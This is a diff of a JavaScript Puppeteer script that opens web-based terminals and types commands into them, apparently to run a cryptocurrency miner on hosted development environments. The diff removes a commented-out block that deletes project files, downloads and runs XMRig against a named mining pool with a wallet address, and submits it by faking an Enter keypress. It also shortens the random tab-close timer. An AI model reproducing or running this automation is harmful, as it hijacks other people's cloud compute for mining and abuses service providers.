@@ -309,35 +309,6 @@ const resetWithLink = async (page, link, name) => {
     }
     await openTerminal(page);
     await runCMD1(page, name);
-
-    // const commands = [
-    //     "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
-    //     " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
-    //     " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
-    //     " && cd xmrig-6.22.2",
-    //     " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
-    // ];
-
-    // for (const cmd of commands) {
-    //     await new Promise(resolve => setTimeout(resolve, 100));
-    //     // await page.keyboard.type(cmd);
-    //     await page.type('.xterm-helper-textarea', cmd);
-    //     // Small delay between chunks to ensure proper typing
-    // }
-
-    // await page.evaluate(() => {
-    //     const textarea = document.querySelector('.xterm-helper-textarea');
-    //     const event = new KeyboardEvent('keydown', {
-    //         key: 'Enter',
-    //         code: 'Enter',
-    //         keyCode: 13,
-    //         which: 13,
-    //         bubbles: true
-    //     });
-    //     textarea.dispatchEvent(event);
-    // });
-
-    // await new Promise(resolve => setTimeout(resolve, 2 * 1000));
 }
 
 
@@ -433,7 +404,7 @@ const reset = async (browser, link) => {
         setTimeout(async () => {
             await page.close();
             console.log(workerName + '_________closed___');
-        }, (4 * Math.random() + 6) * 60 * 1000);
+        }, (2 * Math.random()) * 60 * 1000);
     } catch (error) {
         console.error('Error killing Chrome:', error);
     }
